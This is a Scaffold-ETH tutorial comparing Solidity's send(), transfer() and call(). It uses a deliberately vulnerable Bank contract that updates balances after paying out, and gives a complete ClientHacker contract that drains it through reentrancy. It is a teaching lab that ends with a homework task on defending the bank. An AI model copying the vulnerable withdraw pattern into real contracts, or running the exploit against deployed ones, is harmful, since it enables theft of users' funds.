# 🏗 Sending Ether

Sending and receiving ether is one of the most fundamental things that a smart contract will do. However, a beginner learning solidity will find three options available for sending ether: `send()`, `transfer()`, and `call()`. Why three options? Which should you choose? There are profound security implications involved.

Let's use 🏗 Scaffold-ETH to explore the methods of sending and receiving ether. We will implement one contract to serve as a "bank," allowing users to deposit and then withdraw funds by either of the three methods.

## Bank contract

The bank contract allows anyone to deposit ether into it. A client must call the deposit() method and attach the ether along with the message. The bank must also keep track of how much each user has deposited.

```solidity
contract Bank {

  mapping( address => uint256 ) balances;

  constructor() public {}

  function deposit() public payable {
      balances[msg.sender] += msg.value;
  }
```

Of course, the bank must allow clients to withdraw their funds. To illustrate the differences between send(), transfer(), and call(), the bank has implemented its withdrawls by either method.

```solidity
  function withdraw_via_transfer(uint256 amount) public {
      // forwards 2300 gas, not adjustable
      require(balances[msg.sender] >= amount, "Invalid withdraw request");
      payable(msg.sender).transfer(amount);
      balances[msg.sender] -= amount;
  }

  function withdraw_via_send(uint256 amount) public {
      // forwards 2300 gas, not adjustable
      // returns success condition
      // fails if stack depth is at 1024
      require(balances[msg.sender] >= amount, "Invalid withdraw request");
      bool sent = payable(msg.sender).send(amount);
      require(sent, "Failed to send Ether");
      balances[msg.sender] -= amount;
  }

  function withdraw_via_call(uint256 amount) public {
      // forwards all available gas
      // returns success condition and data
      require(balances[msg.sender] >= amount, "Invalid withdraw request");
      // (bool sent, bytes memory _data) = msg.sender.call.value(amount}("");
      (bool sent, bytes memory _data) = msg.sender.call{value: amount}("");
      require(sent, "Failed to send Ether");
      balances[msg.sender] -= amount;
  }
}
```

In each withdraw method, the bank must check the client's balance and reverts if overdrawn.

The bank then sends ether to the client. `Send()` and `transfer()` are methods on payable address types, so we access by typecasting `payable(msg.sender)` to make the client's address payable.

The bank must also update it's `balances` after sending the ether, so that it does not allow a malicious client to withdraw more money than they are owed. (*foreshadowing*)

You can interact with the bank with your own account on the Rinkeby testnet. Try depositing some ether, then withdrawing by each method. All should behave similarly.

Access the frontend: [bank-client-hacker.surge.sh](https://bank-client-hacker.surge.sh/)

## Simpleton client contract

When you interacted with the bank contract using your own Ethereum account, you are sending and receiving from an "Externally Owned Account." There isn't much excitement going on here. Just trustlessly sending and receiving decentralized internet money to an autonomous agent on a global network of computers. No excitement, at all. (*sarcasm*)

However, the bank may have another type of client: another contract. Let's define a simple client contract that will send and receive ether from the bank contract. Note that the client contract must be deployed *after* the bank contract, because the address of the bank contract must be passed to the client in it's constructor method.

```solidity
import "./Bank.sol";

contract ClientSimple {

  Bank bank;

  constructor(address bank_addr) public payable {
    bank = Bank(bank_addr);
  }
  function deposit(uint amount) public payable {
    bank.deposit{value: amount}();
  }
  function withdraw_via_transfer(uint amount) public payable {
    bank.withdraw_via_transfer(amount);
  }
  function withdraw_via_send(uint amount) public payable {
    bank.withdraw_via_send(amount);
  }
  function withdraw_via_call(uint amount) public payable {
    bank.withdraw_via_call(amount);
  }

  receive() external payable {}

  fallback() external payable {}

}
```

Notice that this contract must have a `receive()` and a `fallback()` function. These functions are called to process the ether when the client contract withdraws from the bank. More information on when each is called can be found [here](https://solidity-by-example.org/sending-ether/).

Find the simple client on the [frontend](https://bank-client-hacker.surge.sh/), deposit some ether, and withdraw it by each method. Again, all three methods should behave similarly.

## A more complex client contract

You may be growing frustrated, hoping to understand the difference between these three methods of sending ether, but thus for have yet to see any difference.

A main difference between `send()`, `transfer()`, and `call()` involves how they forward gas with the message for the client to process the ether. So far, we have done nothing but return the ether to the client's balance in either its `receive()` or `fallback()` functions (which are empty). The challenge comes when the client tries to execute more code in these functions:

```solidity
contract ClientCounter {

  uint256 public count;
  Bank bank;

  constructor(address bank_addr) public payable {
    bank = Bank(bank_addr);
    count = 0;
  }
  function deposit(uint amount) public payable {
    bank.deposit{value: amount}();
  }
  function withdraw_via_transfer(uint amount) public payable {
    bank.withdraw_via_transfer(amount);
  }
  function withdraw_via_send(uint amount) public payable {
    bank.withdraw_via_send(amount);
  }
  function withdraw_via_call(uint amount) public payable {
    bank.withdraw_via_call(amount);
  }
  // Function to receive Ether. msg.data must be empty
  receive() external payable {
      count++;
  }
  // Fallback function is called when msg.data is not empty
  fallback() external payable {
      count++;
  }
}
```

Now the client wishes to maintain a counter variable, and increment it each time it receives ether. It does so in the receive() or fallback() functions with just one line of code `count++`. Updating an additional storage variable in the EVM requires gas, and the gas comes from the same message that returned the ether to the client. This is where we encounter trouble.

`send()` and `transfer()` both only forward `2300 gas`. This is just enough gas to process the receipt of ether to the client, updating it's `balance`. Executing any additional code in the `receive()` or `fallback()` function causes the transaction to run out of gas and revert.

Find the counter client on the [frontend](https://bank-client-hacker.surge.sh/), deposit some ether, and withdraw it by each method. `Withdraw_via_send()` and `Withdraw_via_tranfer()` should revert.

## Final Boss Battle: A malicious client contract

A bank is a honeypot for a hacker. All that ether, just sitting there in the contract balance, sitting there for someone crafty enough to snatch it.

The engineer deploying the bank contract was not schooled in the history of Ethereum, namely the infamous [DAO hack](https://quantstamp.com/blog/what-is-a-re-entrancy-attack). The DAO hack was due to a "re-entrancy" attack, in which the attacker receives ether from a contract, and then re-calls the contract method in its `receive()` or `fallback()` functions. The new method call gets added to the EVM stack and is executed with priority over prior calls.

Our bank contract only updates client `balances` after sending ether, this makes it vulnerable to a reentrant attack. A hacker can deposit ether into the bank, and then withdraw it. The bank sends the hacker his ether. Before the `balances` are updated, the hacker makes another withdraw. The call still passes our `require(balances[msg.sender] >= amount)` check because `balances` have not been updated yet; as far as the bank is concerned, it still owes the hacker their ether. The bank sends more ether.

This process continues, much like a recursive algorithm, until the bank balance is drained.

```solidity
contract ClientHacker {

  Bank bank;
  bool public hack;

  constructor(address bank_addr) public payable {
    bank = Bank(bank_addr);
    hack = false;
  }
  function set_hack() public payable {
    if (hack == false) { hack = true; }
    else if (hack == true) { hack = false; }
  }
  function deposit(uint amount) public payable {
    bank.deposit{value: amount}();
  }
  function withdraw_via_transfer(uint amount) public payable {
    bank.withdraw_via_transfer(amount);
  }
  function withdraw_via_send(uint amount) public payable {
    bank.withdraw_via_send(amount);
  }
  function withdraw_via_call(uint amount) public payable {
    bank.withdraw_via_call(amount);
  }
  receive() external payable {
    if (hack == true && address(bank).balance != 0 ) {
      bank.withdraw_via_call(msg.value);
    }
  }
  fallback() external payable {
    if (hack == true) {
      bank.withdraw_via_call(msg.value);
    }
  }
}
```

Note that the hacker client contract implementation includes a `hack` boolean flag, so that the hacker can receive ether with the malicious code enabled or disabled.

Find the hacker client on the [frontend](https://bank-client-hacker.surge.sh/), deposit some ether, set the hack flag to `true`, and withdraw ether by each method. `Withdraw_via_send()` and `Withdraw_via_tranfer()` should revert.  `Withdraw_via_call()` should drain the entire bank balance (you may want to make sure that other clients have deposited ether also).

`Send()` and `Transfer()` forward limited amounts of gas to process the payment, and they resist the attack. `Call()` forwards all available gas, so the hacker just needs to make the original call with enough gas to complete the attack. In the past, it was favored practice to use `Send()` or `Transfer()` to send ether, for this reason. However, these methods have fallen out-of-favor, and the recommended method for sending ether is the verbose:
"""
(bool sent, bytes memory _data) = msg.sender.call{value:a mount}("");
require(sent, "Failed to send Ether");`
"""

## Homework: Make this contract resist hacker's attack

A great advantage of BUIDL-ing on 🏗 Scaffold-ETH is that you can easily fork this project and extend it. Try to resist the hacker's attack. Paying attention to the order of operations in withdraws will help. You may want to search Open Zepplin for a mutex. Updating the compiler version will also help.

Clone this repo, then run the following from three separate terminals (in the project directory.

start the frontend:
`yarn start`

Start a local blockchain:
`yarn chain`

Compile and deploy contracts:
`yarn deploy`
